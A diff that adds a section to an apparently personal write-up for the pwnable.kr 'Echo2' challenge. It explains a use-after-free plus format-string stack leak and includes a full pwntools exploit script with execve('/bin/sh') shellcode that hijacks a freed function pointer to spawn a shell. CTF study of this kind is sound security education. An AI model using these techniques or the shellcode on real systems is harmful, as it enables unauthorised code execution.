@@ -141,7 +141,61 @@ ssh.interactive()
 
 ```
 
+### Echo2 - Level 13
 
+This time we have the same program as `echo`, but the difference now is that we can only choose `FSB` or `UAF` in the menu.
+One important thing we need to notice, is that once we press `4` for exit, it will instanstly free the `o` variable, which is storing the echo function.
+We can use that for our own advantage, since we can trigger a free, and the program will still be ran (if we press n)
+This way we can override the `greetings` function stored in the `o` variable, and jump to any location we want.
+The way I did it is by entering a shellcode in the name (because then it will be in the stack).
+Then I used the `FSB` in the menu, to leak stack addresses.
+I noticed that in the 10th paramater, there is a pointer to the stack which is 32 bytes after our input.
+So if we substract 32 from that number, and override the `greetings` function with it, we will run the shellcode specified in the name!
+#Final exploit:
+
+
+```py
+from pwn import *
+
+p=remote('pwnable.kr',9011)
+
+shellCode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
+print(p.recv().decode())
+
+#Sending username
+p.sendline(shellCode)
+
+print(p.recv())
+
+#trigger free
+print("Triggering free...")
+p.sendline(b"4")
+print(p.recv().decode())
+p.sendline(b"n")
+
+print("Getting stack addresses...")
+print(p.recv().decode())
+p.sendline(b"2")
+print(p.recv().decode())
+p.sendline(b"%10$p")
+p.recv()
+stack_addr = p.recv().decode().split("\n")[0]
+
+
+print("stack leaked address is", stack_addr)
+
+shellCodeAddr = p64(int(stack_addr, 16) - 32)
+
+print("shellcode leaked addr: ", hex(u64(shellCodeAddr)))
+p.sendline(b"3")
+
+#changing the greeteings to jmp to our shellcode
+p.sendline((24 * b"\x90") +  shellCodeAddr)
+
+p.interactive()
+
+
+```
 
 
 
